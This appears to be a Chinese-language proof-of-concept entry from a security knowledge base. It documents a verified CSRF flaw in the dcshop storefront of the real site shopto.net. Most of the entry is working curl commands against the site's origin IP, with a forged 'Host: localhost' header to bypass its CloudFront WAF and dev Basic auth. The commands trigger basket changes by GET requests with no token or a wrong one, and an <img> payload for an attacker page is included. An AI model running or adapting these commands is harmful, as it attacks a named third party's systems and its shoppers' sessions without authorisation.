# ShopTo/DcCMS dcshop 店铺前端状态变更动作无服务端 CSRF 令牌校验且可 GET 触发（SameSite=Lax 下跨站加购/改车）

- **code**: shopto-origin-dcshop-storefront-csrf-no-token-get-trigger
- **kind**: poc
- **category**: auth-bypass
- **component**: DcCMS 2015 / dcshop storefront（shopToActionProtection 动作白名单，源站 nginx 多 vhost）
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 14:4x GMT，ARTEX 执行机 curl 8.5.0 直连 shopto.net 源站 3.8.196.174（Host: localhost，绕过 CloudFront WAF 与 dev 的 Basic auth），finding#75 / verdict=verified。(1) 阴性对照：新建独立 cookie jar，GET /en/basket/ → 购物车 js-order-price-total">$0.00 (0)；(2) 纯 GET 且不带 storefront_token 触发加购 GET /en/0002153-erdinger-...-p51872/queue/?action=shop_add_item_to_basket_card&item_id=51872&item_qty=1&item_var_code= → HTTP 200，随后购物车 total">£32.85 (1)（含 action_id=4573 的移除链接），证明动作被接受且状态真被改变；(3) 故意传错令牌 POST ... storefront_token=deadbeef1234 → 仍 HTTP 200、购物车 1 件，证明服务端根本不校验令牌；(4) 纯 GET 移除 /en/basket/?action=shop_remove_item_from_basket_by_id&action_id=4573 → 200、购物车回到 $0.00 (0)。服务端令牌来源：首页内联 window.shopToActionProtection = {"token":"","actions":[...]}（源站 token 为空串；生产 www 首页 token 非空）。对照实验用独立 cookie jar 排除会话串扰。
- **path**: pocs/shopto-origin-dcshop-storefront-csrf-no-token-get-trigger/poc.md
- **tags**: csrf, dcshop, dccms, shopto, storefront_token, samesite-lax, get-method, shopping-cart, host-header, origin-direct
- **created_at**: 2026-11-11T15:05:51.189Z
- **engine**: https://3.8.196.174（shopto.net 源站 dcshop 店铺前端，Host: localhost）

## 描述

原理：dcshop 店铺前端把所有状态变更动作（shop_add_item_to_basket_card / shop_remove_item_from_basket_by_id 等，见首页 window.shopToActionProtection.actions 白名单）挂在一个 /queue/?action=... 的通用处理器上，服务端既不校验 storefront_token（错误/缺失令牌同样生效），也不限制 HTTP 方法（纯 GET 即可触发）。前提：能直连源站（Host: localhost 绕过 CloudFront/Basic）且源站下发的 token 为空串（dev/staging 环境）；匿名会话即可。影响：结合浏览器 SameSite=Lax 对顶层导航放行 cookie 的规则，攻击者构造指向 /en/<slug>/queue/?action=... 的链接即可让受害者在自身会话内被加购/改车（CWE-352），反 CSRF 防护形同虚设。

## 用法

```
前置：源站直连可达——URL 用 https://<源站IP>/，请求头 Host: localhost（绕过 CloudFront WAF 与 dev 的 HTTP Basic）；curl 加 -k，必要时 --http1.0；匿名会话即可，无需登录，cookie jar 保存服务端下发的 sidb2c。

【0) 先看令牌是否为空（判死/判活的关键）】
GET /en/  → 抓内联 JSON：window.shopToActionProtection = {"token":"","actions":["shop_login","shop_add_item_to_basket_card",...]}
token 为空串 ⇒ 源站对令牌无实际校验（生产 www 首页 token 非空）。

【1) 阴性对照：操作前购物车必须为空】
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' https://<源站IP>/en/basket/ | grep js-order-price-total   # 期望 $0.00 (0)

【2) 纯 GET、不带令牌触发加购】
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' 'https://<源站IP>/en/<slug>/queue/?action=shop_add_item_to_basket_card&item_id=<id>&item_qty=1&item_var_code='   # 期望 200

【3) 阳性对照：购物车状态确被改变】
再次 GET /en/basket/  # 期望 total">£32.85 (1)，并出现 action=shop_remove_item_from_basket_by_id&action_id=<id>

【4) 证明服务端不校验令牌：错误 storefront_token 仍生效】
POST 同动作 --data item_id=<id>&item_qty=1&item_var_code=&action=shop_add_item_to_basket_card&storefront_token=deadbeef1234  # 期望 200 且购物车仍 +1

【5) 移除动作同样可被纯 GET 触发】
GET /en/basket/?action=shop_remove_item_from_basket_by_id&action_id=<id>   # 期望 200 且购物车回到 $0.00 (0)

判据：token 字段为空串 + 纯 GET/无令牌/错令牌均被接受 + 购物车确实增减 = 命中。失败常见原因：① 打的是生产 www（token 非空）；② 走了 CloudFront 边缘（伪造 Host 被 403，必须直连源站 IP）；③ 未加 --http1.0 导致 empty reply；④ cookie jar 未复用导致会话串扰、对照失真。
```

## 正文

```
# ShopTo/DcCMS dcshop 店铺前端 CSRF：状态变更动作不校验 storefront_token 且可 GET 触发

## 结论一句话
dcshop 店铺前端把全部状态变更动作挂在通用处理器 `/en/<页面>/queue/?action=<动作名>` 上，
服务端**既不校验 storefront_token**（缺失/错误令牌同样生效）、**也不限制 HTTP 方法**（纯 GET 即可触发）。
配合浏览器 SameSite=Lax 对顶层导航放行 cookie 的规则，攻击者可让受害者在自身会话内被加购/改车（CWE-352）。

> 归类说明：本条目本质是 CSRF（缺服务端请求验证），知识库无 csrf 分类，就近归入 auth-bypass（反 CSRF 校验控制失效）。

## 适用面 / 前置
- 目标为 DcCMS 2015 / dcshop 系店铺前端（首页内联 `window.shopToActionProtection` 保护的动作白名单）。
- 源站直连可达：URL 用 `https://<源站IP>/`，请求头 `Host: localhost`（绕过 CloudFront WAF 与 dev 的 HTTP Basic）。
- curl 加 `-k`，必要时 `--http1.0`（部分路径 HTTP/1.1 会 empty reply）。
- 匿名会话即可，无需登录；cookie jar 保存服务端下发的 `sidb2c`。
- 源站下发的 token 为空串（dev/staging 环境特征）。

## 关键判据
1. 首页内联对象里 `token` 为空串：
   ```html
   window.shopToActionProtection = {"token":"","actions":["shop_login","shop_add_item_to_basket_card","shop_remove_item_from_basket_by_id", ...]}
   ```
2. 纯 GET、且不带 `storefront_token`，`/queue/?action=...` 返回 200 且购物车状态真的改变（阴性/阳性对照）。
3. 故意提供错误 `storefront_token` 仍然生效 → 服务端根本不校验。
（生产 www 首页 token 非空，别把生产站当同一结论。）

## 复现步骤（curl）

```bash
IP=<源站IP>; SLUG=0002153-erdinger-alkoholfrei-24-x-50-cl-shrink-wrapped-p51872

# 0) 看令牌是否为空
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' https://$IP/en/ | grep -o 'shopToActionProtection = {[^}]*}'

# 1) 阴性对照：购物车为空
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' https://$IP/en/basket/ \
  | grep js-order-price-total          # 期望 $0.00 (0)

# 2) 纯 GET、无令牌加购
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' \
  "https://$IP/en/$SLUG/queue/?action=shop_add_item_to_basket_card&item_id=51872&item_qty=1&item_var_code="
# 期望 HTTP/1.0 200

# 3) 阳性对照：购物车 +1
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' https://$IP/en/basket/ \
  | grep js-order-price-total          # 期望 £32.85 (1)，并出现 action=shop_remove_item_from_basket_by_id&action_id=<id>

# 4) 错误令牌仍生效（证明不校验）
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' \
  -X POST "https://$IP/en/$SLUG/queue/?action=shop_add_item_to_basket_card" \
  --data 'item_id=51872&item_qty=1&item_var_code=&action=shop_add_item_to_basket_card&storefront_token=deadbeef1234'
# 期望 200，购物车仍 +1

# 5) 移除动作同样可被纯 GET 触发
curl -sk --http1.0 -c cj.txt -b cj.txt -H 'Host: localhost' \
  "https://$IP/en/basket/?action=shop_remove_item_from_basket_by_id&action_id=4573"
# 期望 200，购物车回到 $0.00 (0)
```

## 利用形态（浏览器侧）
攻击者页面仅需：

```html
<img src="https://<门店域>/en/<商品slug>/queue/?action=shop_add_item_to_basket_card&item_id=<id>&item_qty=1&item_var_code=">
```

或让受害者顶层导航到该 URL（顶层导航对 SameSite=Lax 的 cookie 放行），即在其会话内完成加购/改车。

## 失败常见原因
- 打的是**生产 www**：token 非空，服务端可能真校验 → 先确认 token 是否为空串。
- 走了 **CloudFront 边缘**：伪造 Host 会被 403 拦下，必须直连源站 IP。
- 未加 `--http1.0`：部分路径 empty reply。
- **cookie jar 未复用**：会话串扰会让阴阳对照失真，验证时用独立 cookie jar。
```
